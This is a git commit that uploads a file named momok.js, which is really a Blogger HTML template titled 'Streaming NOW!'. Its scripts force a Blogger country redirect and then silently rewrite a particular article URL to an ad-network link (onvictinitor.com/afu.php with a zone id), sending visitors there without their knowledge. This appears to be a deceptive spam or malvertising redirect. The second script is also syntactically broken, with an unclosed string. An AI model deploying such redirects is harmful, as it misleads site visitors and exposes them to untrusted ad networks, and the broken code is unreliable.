7f2eb442013ab97e4ec552ab33a3c3b66622ee0c
ginanjarsaputra <59138497+ginanjarsaputra@users.noreply.github.com>
2019-12-23 14:29:18 +0700

    Add files via upload

---
+++ momok.js
@@ -0,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html>
+<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+<title>Streaming NOW!</title>
+<META CONTENT='NOINDEX, NOFOLLOW' NAME='ROBOTS'/>
+<b:skin><![CDATA[ ]]></b:skin>
+
+<script type='text/javascript'>
+var blog = document.location.hostname;
+var slug = document.location.pathname;
+var ctld = blog.substr(blog.lastIndexOf("."));
+if (ctld != ".com") {
+var ncr = "http://" + blog.substr(0, blog.indexOf("."));
+ncr += ".blogspot.com/ncr" + slug;
+window.location.replace(ncr);
+}
+</script>
+<script type='text/javascript'>
+var u=document.URL;
+u=u.replace('https://download.iflixstream.com/2019/12/23/8-features-to-consider-when-looking-for-a-gaming-desk/', 'http://onvictinitor.com/afu.php?zoneid=2992455);
+location.href = u;
+</script>
+</head>
+<body>
+<b:section id='contoh'/> 
+</body>
+</html>
